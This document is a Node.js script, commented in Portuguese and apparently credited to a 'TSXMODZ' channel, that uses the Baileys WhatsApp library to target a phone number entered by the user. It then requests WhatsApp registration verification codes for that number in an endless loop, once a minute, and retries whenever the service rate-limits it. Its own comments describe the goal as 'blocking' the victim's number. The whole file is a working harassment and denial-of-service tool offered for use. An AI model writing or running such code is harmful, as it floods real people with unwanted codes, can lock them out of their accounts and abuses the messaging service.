import prompt from 'prompt-sync';
import gradient from 'gradient-string';
import pino from 'pino';
import fs from 'fs';
import { useMultiFileAuthState, makeWASocket } from '@whiskeysockets/baileys';

// Definindo informações do criador
const creatorInfo = {
    channelName: 'TSXMODZ',
    instagram: '@eu_luan_xz',
    whatsapp: '+55 66 9281-8852'
};

// Função para exibir informações do criador
const displayCreatorInfo = () => {
    console.clear();
    console.log(gradient('cyan', 'green', 'yellow')('Informações do Criador:'));
    console.log(gradient('cyan', 'green', 'yellow')(`Canal: ${creatorInfo.channelName}`));
    console.log(gradient('cyan', 'green', 'yellow')(`Instagram: ${creatorInfo.instagram}`));
    console.log(gradient('cyan', 'green', 'yellow')(`WhatsApp: ${creatorInfo.whatsapp}`));
    console.log(gradient('cyan', 'green', 'yellow')('■'));
    console.log(gradient('cyan', 'green', 'yellow')('■'));
    console.log(gradient('cyan', 'green', 'yellow')('■'));
};

// Carregar números de um arquivo JSON
const loadNumbers = () => {
    try {
        return JSON.parse(fs.readFileSync('./files/numbers.json'));
    } catch (error) {
        console.error(gradient('cyan', 'green', 'yellow')('Erro ao carregar números: ' + error));
        return {};
    }
}

// Função principal para iniciar o aplicativo
const start = async () => {
    displayCreatorInfo(); // Exibe informações do criador

    const { state, saveCreds } = await useMultiFileAuthState('.oiii');

    // Use makeWASocket em vez de makeWaSocket
    const spam = makeWASocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const numbers = loadNumbers(); // Carregar números existentes

    // Função para "bloquear" número e solicitar códigos
    const requestVerificationCode = async ({ phoneNumber, ddi, number }) => {
        while (true) {
            try {
                console.clear();
                console.log(gradient('cyan', 'green', 'yellow')('Solicitando código para ' + ddi + number));
                
                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                if (res.reason === 'temporarily_unavailable') {
                    console.log(gradient('cyan', 'green', 'yellow')('Serviço temporariamente indisponível. Tentando novamente em ' + res.retry_after + ' segundos.'));
                    setTimeout(() => requestVerificationCode({ phoneNumber, ddi, number }), res.retry_after * 1000);
                    return;
                } else {
                    console.log(gradient('cyan', 'green', 'yellow')('Código solicitado com sucesso!'));
                }
                
                // Aguardar um intervalo antes de solicitar novamente
                await new Promise(resolve => setTimeout(resolve, 60000)); // Aguardar 1 minuto
            } catch (error) {
                console.error(gradient('cyan', 'green', 'yellow')('Erro: ' + error));
            }
        }
    };

    // Instanciar o prompt
    const input = prompt(); // Inicializa o prompt

    // Alteração das cores dos prompts para DDI e número
    const ddi = input(gradient('cyan', 'green', 'yellow')('[+] Digite o DDD do alvo: '));
    const number = input(gradient('cyan', 'green', 'yellow')('[+] Digite o número do alvo: '));
    const phoneNumber = ddi + number;

    // Armazenar número no arquivo JSON
    numbers[phoneNumber] = { ddi, number };
    fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));

    await requestVerificationCode({ phoneNumber, ddi, number });
};

start();
